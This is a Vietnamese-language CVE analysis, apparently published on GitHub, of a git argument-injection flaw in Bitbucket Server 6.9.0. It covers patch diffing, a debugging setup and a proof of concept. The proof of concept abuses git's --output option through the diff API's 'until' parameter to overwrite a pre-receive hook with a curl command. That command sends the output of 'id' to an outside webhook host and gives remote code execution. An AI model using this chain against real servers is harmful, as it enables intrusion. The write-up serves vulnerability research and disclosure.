# Description

Mô tả trên trang [Atlassian](https://jira.atlassian.com/browse/BSERV-12099)

<img src="https://imgur.com/78SHZpm.png">

# Patch Analysis
Tải bản có lỗi [6.9.0](https://www.atlassian.com/software/bitbucket/download-archives) và bản vá [6.9.1](https://www.atlassian.com/software/bitbucket/download-archives) sau đó diff hai bản bằng winmerge
<img src="https://imgur.com/qpipHjz.png">
So sánh code giữa hai phiên bản thì thấy ở phiên bản 6.9.1 tại class ```DefaultGitScmCommandBuilder``` tham số "commitish" được kiểm tra bởi hàm ```notBlank()``` trước bước kiểm tra ```startsWith("-")```
<img src="https://imgur.com/tzcls4e.png">
Trong khi đó ở phiên bản 6.9.0 thì diễn ra ngược lại
<img src="https://imgur.com/NIL9xaJ.png">
<img src="https://imgur.com/yT3R42n.png">
Hàm ```notBlank()``` gọi đến ```trim()``` để xóa đi khoảng trắng ở đầu và cuối chuỗi.Điều này đã gọi ý rằng một giá trị của commitish có dạng " -xxx" đã được dùng để khai thác lỗi.

# Setup
Ở đây mình dựng app bằng [docker](https://hub.docker.com/r/atlassian/bitbucket-server/tags?page=1&name=6.9.0)
Sau đó chạy command sau để start container
```
docker run -d -p 8080:7990  -p 5005:5005 -e JAVA_TOOL_OPTIONS="-agentlib:jdwp=transport=dt_socket,address=*:5005,server=y,suspend=n" docker-java-jar:latest
```
Setup debug
Tạo folder ```jar_files_0``` trong ```atlassian-bitbucket-6.9.0``` và dùng command sau để copy tất cả các file jar trong source vào folder này.

```find . -iname '*.jar' -exec cp {} libs_debug \;```

<img src="https://imgur.com/vc05Lvc.png">
Mở folder source với intellj idea, vào Project Structure -> + -> Java

<img src="https://imgur.com/oVpRnEK.png">
Và chọn folder ``` jar_files_0 ```
<img src="https://imgur.com/bCM7iJM.png">
Add thêm Debug configuration như sau:
<img src="https://imgur.com/f1WCY14.png">

# Analysis
Về mặt kỹ thuật, Bitbucket sẽ dùng Git binary với commitish là một argument để thực hiện các tác vụ tương ứng với từng chức năng cụ thể.
Đặt breakpoint tại ```com.atlassian.stash.internal.scm.git.command.DefaultGitScmCommandBuilder.commitish```
Thử chức năng diff ```/projects/HEL/repos/ok/diff/test.py?until=hello``` thì thấy trigger được breakpoint
<img src="https://imgur.com/uAsX7JV.png">

Một cách phổ biến khai thác các lỗi liên quan đến git argument injection là lợi dụng option --output để ghi file.
Từ quá trình phân tích code, có thể thấy /rest/api/latest/projects/{project}/repos/{repo}/diff/{file}?until={until} là một API tiềm năng, với {until} là commitish, và dẫn đến câu lệnh sau được thực thi:

``` /usr/bin/git log -C --color=never -U10 --dst-prefix=dst:// --src-prefix=src:// --pretty=format: -1 {until} -- {file} ```

ghi đè lên file /tmp/123
<img src="https://imgur.com/TPwEZ7i.png">
```
# cat /tmp/123
diff --git src://test.py dst://test.py
index e7760b0..42068ad 100644
--- src://test.py
+++ dst://test.py
@@ -1 +1 @@
-okkkkkk
+helooooooooooo
```
# POC
Như vậy là ta có thể RCE bằng cách ghi đè vào file [/var/atlassian/application-data/bitbucket/shared/data/repositories/1/hooks/pre-receive.d/20_bitbucket_callback](https://confluence.atlassian.com/bitbucketserverkb/how-to-create-a-simple-hook-in-bitbucket-data-center-and-server-779171711.html)
Để tránh bị ảnh hưởng với các ký tự liên quan đến định dạng của file diff, chúng ta sẽ dùng câu lệnh có dạng ```&curl https://webhook.site/751ee050-bdd3-4ddf-93b0-a8060302fd05/?q=`id`&``` và ghi đè vào file ```/var/atlassian/application-data/bitbucket/shared/data/repositories/1/hooks/pre-receive.d/20_bitbucket_callback```.

![image](https://github.com/DuyVuong/CVE-Analysis/assets/125139802/2a1e9c09-2c7f-479c-ad1b-c17996b7f33c)
```
# cat /var/atlassian/application-data/bitbucket/shared/data/repositories/1/hooks/pre-receive.d/20_bitbucket_callback
diff --git src://test.py dst://test.py
index c0f625f..9cc4b98 100644
--- src://test.py
+++ dst://test.py
@@ -1 +1 @@
-&curl https://webhook.site/751ee050-bdd3-4ddf-93b0-a8060302fd05&
+&curl https://webhook.site/751ee050-bdd3-4ddf-93b0-a8060302fd05/?q=`id`&
```
push lại một file bất kì
![image](https://github.com/DuyVuong/CVE-Analysis/assets/125139802/8243638d-9165-4af7-a889-0a6ec52ecef3)

![image](https://github.com/DuyVuong/CVE-Analysis/assets/125139802/e053952a-e036-442e-97f9-1d6bd2a90394)








